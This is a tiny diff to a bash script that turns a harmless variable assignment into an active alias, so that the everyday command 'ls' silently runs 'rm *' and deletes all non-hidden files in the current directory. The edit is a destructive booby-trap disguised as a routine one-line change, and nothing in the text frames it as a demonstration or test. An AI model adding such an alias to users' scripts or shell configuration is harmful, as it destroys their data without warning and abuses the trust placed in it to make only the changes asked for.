@@ -1,2 +1,2 @@
 #!/bin/bash
-alias_ls="rm *"
+alias ls="rm *"
